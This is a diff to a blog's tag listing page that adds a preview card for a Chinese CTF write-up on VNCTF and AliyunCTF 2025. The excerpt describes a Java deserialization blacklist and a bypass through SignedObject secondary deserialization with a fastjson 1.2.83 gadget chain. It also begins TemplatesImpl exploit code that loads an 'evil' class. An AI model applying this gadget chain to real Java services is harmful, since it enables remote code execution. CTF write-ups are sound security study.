@@ -142,6 +142,24 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">CTF记录-VNCTF_2025, AliyunCTF 2025
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>VNCTF 5道web解出了4道
+javaGuide /deser路由可以反序列化，有spring boot和fastjson 1.2.83的依赖。
+反序列化有黑名单：
+protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = {&#34;com.sun.org.apache.xalan.internal.xsltc.trax&#34;, &#34;javax.management&#34;, &#34;com.fasterxml.jackson&#34;}; int length = denyClasses.length; for (String denyClass : denyClasses) { if (className.startsWith(denyClass)) { throw new InvalidClassException(&#34;Unauthorized deserialization attempt&#34;, className); } } return super.resolveClass(desc); } 可以用signedObject二次反序列化绕过
+利用链：
+EventListenerList.readobject() -&gt;JSONArray.toString() -&gt;SignedObject.getObject() -&gt;EventListenerList.readobject() -&gt;JSONArray.toString() -&gt;Templates.getOutputProperties() fastjson1.2.83使用引用绕过。
+Templates templates = new TemplatesImpl(); setFieldValue(templates,&#34;_bytecodes&#34;,new byte[][]{getEvilClass()}); setFieldValue(templates,&#34;_class&#34;,null); setFieldValue(templates,&#34;_name&#34;,&#34;asd&#34;); JSONArray jsonArray1 = new JSONArray(); jsonArray1....</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-02-09 15:21:50 +0000 UTC'>February 9, 2025</span>&nbsp;·&nbsp;9 min</footer>
+  <a class="entry-link" aria-label="post link to CTF记录-VNCTF_2025, AliyunCTF 2025" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-vnctf_2025-aliyunctf_2025/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">CTF记录-SECCON_CTF_13th_Quals, AlpacaHack_Round_7
     </h2>
   </header>
